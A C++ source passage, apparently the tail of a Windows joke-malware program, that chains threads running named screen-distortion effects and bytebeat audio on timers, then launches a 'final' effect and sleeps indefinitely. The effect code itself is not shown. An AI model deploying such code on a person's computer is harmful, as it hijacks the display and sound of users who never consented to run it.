			System::EndPayload(hBytebeatC, hBBC);
			System::EndPayload(hPayloadD, hPMLD);
			System::EndPayload(hPayloadE, hPMLE);
			System::RedrawScreen();
			shakeIntensity = 10;
			warpIntensity = 20;
			colorsdelay = 50;
			HANDLE hBBX = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hBytebeatX = CreateThread(NULL, NULL, &Bytebeats::sound2, hBBX, NULL, NULL);
			HANDLE hPML13 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload13 = CreateThread(NULL, NULL, &GDIPayloads::shake, hPML13, NULL, NULL);
			Sleep(2000);
			HANDLE hPML14 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML15 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML16 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload14 = CreateThread(NULL, NULL, &GDIPayloads::ellipses, hPML14, NULL, NULL);
			HANDLE hPayload15 = CreateThread(NULL, NULL, &GDIPayloads::colors, hPML15, NULL, NULL);
			HANDLE hPayload16 = CreateThread(NULL, NULL, &GDIPayloads::warp, hPML16, NULL, NULL);
			Sleep(10000);
			shakeIntensity = 11;
			HANDLE hPML17 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload17 = CreateThread(NULL, NULL, GDIPayloads::bit, hPML17, NULL, NULL);
			Sleep(10000);
			shakeIntensity = 12;
			HANDLE hPML18 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload18 = CreateThread(NULL, NULL, GDIPayloads::xorroto, hPML18, NULL, NULL);
			Sleep(10000);
			HANDLE hBBY = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hBytebeatY = CreateThread(NULL, NULL, Bytebeats::decrescendo, hBBY, NULL, NULL);
			Sleep(5000);
			shakeIntensity = 13;
			HANDLE hPML19 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload19 = CreateThread(NULL, NULL, GDIPayloads::absroto, hPML19, NULL, NULL);
			Sleep(20000);
			shakeIntensity = 15;
			random = false;
			HANDLE hBBZ = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hBytebeatZ = CreateThread(NULL, NULL, Bytebeats::exponential, hBBZ, NULL, NULL);
			HANDLE hPML20 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML21 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML22 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML23 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML24 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML25 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML26 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML27 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload20 = CreateThread(NULL, NULL, GDIPayloads::overdose, hPML20, NULL, NULL);
			HANDLE hPayload21 = CreateThread(NULL, NULL, GDIPayloads::center, hPML21, NULL, NULL);
			HANDLE hPayload22 = CreateThread(NULL, NULL, GDIPayloads::texts, hPML22, NULL, NULL);
			HANDLE hPayload23 = CreateThread(NULL, NULL, GDIPayloads::high, hPML23, NULL, NULL);
			HANDLE hPayload24 = CreateThread(NULL, NULL, GDIPayloads::halftone, hPML24, NULL, NULL);
			HANDLE hPayload25 = CreateThread(NULL, NULL, GDIPayloads::initial, hPML25, NULL, NULL);
			HANDLE hPayload26 = CreateThread(NULL, NULL, GDIPayloads::kaleidoscope, hPML26, NULL, NULL);
			HANDLE hPayload27 = CreateThread(NULL, NULL, GDIPayloads::palette, hPML27, NULL, NULL);
			Sleep(1000 * 40);
			System::EndPayload(hPayload13, hPML13);
			System::EndPayload(hPayload14, hPML14);
			System::EndPayload(hPayload15, hPML15);
			System::EndPayload(hPayload16, hPML16);
			System::EndPayload(hPayload17, hPML17);
			System::EndPayload(hPayload18, hPML18);
			System::EndPayload(hPayload19, hPML19);
			System::EndPayload(hPayload20, hPML20);
			System::EndPayload(hPayload21, hPML21);
			System::EndPayload(hPayload22, hPML22);
			System::EndPayload(hPayload23, hPML23);
			System::EndPayload(hPayload24, hPML24);
			System::EndPayload(hPayload25, hPML25);
			System::EndPayload(hPayload26, hPML26);
			System::EndPayload(hPayload27, hPML27);
			System::EndPayload(hBytebeatZ, hBBZ);
			System::EndPayload(hBytebeatY, hBBY);
			System::EndPayload(hBytebeatX, hBBX);
			HANDLE hBBFINAL = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hFinalBytebeat = CreateThread(NULL, NULL, Bytebeats::noise, hBBFINAL, NULL, NULL);
			HANDLE hEND = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hFinalPayload = CreateThread(NULL, NULL, GDIPayloads::final, hEND, NULL, NULL);
			Sleep(INFINITE);
			return 0;
		}
	}
}